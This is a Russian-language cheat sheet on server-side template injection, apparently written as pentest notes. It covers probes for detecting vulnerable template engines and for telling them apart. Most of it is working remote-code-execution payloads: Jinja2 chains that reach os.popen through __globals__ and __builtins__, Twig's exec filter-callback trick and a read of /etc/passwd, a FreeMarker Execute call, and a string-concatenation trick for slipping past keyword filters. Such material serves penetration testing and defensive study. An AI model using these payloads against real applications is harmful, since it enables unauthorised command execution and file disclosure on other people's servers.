# SSTI

Сначала проверяем, вычисляет ли шаблонизатор выражение `{{7*7}}` в пользовательском вводе. Затем определяем движок: одного результата вычисления для этого недостаточно.

## Определение движка

```
{{7*7}}      -> Jinja2, Twig, Nunjucks
${7*7}       -> Freemarker, Thymeleaf, ещё раз Jinja2 (смотрим контекст)
<%= 7*7 %>   -> ERB / Ruby
```

В таблице выше есть неточность: при стандартных разделителях Jinja2 не вычисляет `${7*7}`. Сопоставление синтаксиса с движком нужно проверять в конкретной конфигурации.

Jinja2 и Twig можно различать по `{{7*'7'}}`: Jinja2 обычно возвращает `7777777`, Twig — `49`. Поведение зависит от версии и настроек.

## Jinja2: к RCE

```jinja
{{config}}
{{self.__init__.__globals__.__builtins__}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Или через request:

```jinja
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Пример конкатенации строковых литералов в имени атрибута:

```jinja
{{request['__cla''ss__'].__mro__[1].__subclasses__()}}
```

Jinja склеивает соседние строковые литералы. Это может обойти проверку на точное вхождение `__class__`, но не запрет подчёркиваний.

## Twig

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Цепочка выше относится к старым версиям Twig. Пример ниже зависит от наличия фильтра в приложении:

```twig
{{'/etc/passwd'|file_excerpt(1,30)}}
```

## Freemarker

```
${"freemarker.template.utility.Execute"?new()("id")}
```

Доступность `?new()` и класса из примера зависит от версии FreeMarker и настроек разрешения классов.

## Что проверять до того, как строить RCE

- Обрабатывает ли шаблонизатор ввод как часть шаблона. Само по себе отражение в HTML не доказывает ни SSTI, ни XSS.
- Есть ли sandbox (SandboxedEnvironment у Jinja ограничивает доступ к небезопасным атрибутам, в том числе `__globals__`).
- Что доступно в контексте: `{{cycler}}`, `{{request}}`, `{{url_for}}` — от этого зависит применимость цепочки.
